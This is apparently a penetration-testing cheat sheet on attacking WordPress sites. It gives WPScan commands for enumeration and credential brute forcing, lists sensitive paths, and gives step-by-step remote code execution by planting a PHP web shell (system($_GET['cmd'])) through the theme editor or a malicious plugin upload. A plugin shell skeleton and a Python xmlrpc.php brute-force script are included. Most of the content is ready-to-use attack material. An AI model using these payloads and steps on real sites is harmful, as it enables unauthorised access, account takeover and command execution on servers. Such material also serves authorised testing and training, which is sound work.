# Hacking WordPress

WordPress is the world's most deployed CMS and a frequent target. Vulnerabilities commonly arise from outdated plugins, themes, and weak credentials.

## Enumeration

```bash
# WPScan — full scan
wpscan --url http://target/ --enumerate u,p,t,cb,dbe

# Enumerate users only
wpscan --url http://target/ --enumerate u

# Enumerate plugins (aggressive)
wpscan --url http://target/ --enumerate p --plugins-detection aggressive

# Brute force credentials
wpscan --url http://target/ -U users.txt -P /usr/share/wordlists/rockyou.txt

# Manual user enumeration via author ID
curl http://target/?author=1
curl http://target/wp-json/wp/v2/users
```

## Interesting Files

```
/wp-login.php          # Admin login
/wp-admin/             # Dashboard
/wp-config.php         # DB credentials (not directly readable via web)
/wp-content/plugins/   # Plugin code
/wp-content/uploads/   # Uploaded files
/xmlrpc.php            # Legacy API (enables brute force in one request)
```

## RCE via Theme Editor

1. Login to `/wp-admin/`
2. **Appearance → Theme Editor**
3. Edit `404.php` or `functions.php`
4. Insert: `<?php system($_GET['cmd']); ?>`
5. Visit `http://target/wp-content/themes/<theme>/404.php?cmd=id`

## RCE via Plugin Upload

1. Login → **Plugins → Add New → Upload Plugin**
2. Upload a ZIP containing a malicious `.php` file
3. Activate the plugin
4. Trigger the shell at `/wp-content/plugins/<plugin>/shell.php?cmd=id`

## Malicious Plugin Skeleton

```php
<?php
/*
Plugin Name: Shell
Version: 1.0
*/
system($_GET['cmd']);
```

```bash
zip plugin.zip shell.php
```

## xmlrpc.php Brute Force

```python
import requests

target = "http://target/xmlrpc.php"
payload = """<?xml version="1.0"?>
<methodCall><methodName>wp.getUsersBlogs</methodName>
<params>
  <param><value><string>admin</string></value></param>
  <param><value><string>PASSWORD</string></value></param>
</params></methodCall>"""

r = requests.post(target, data=payload)
print(r.text)
```
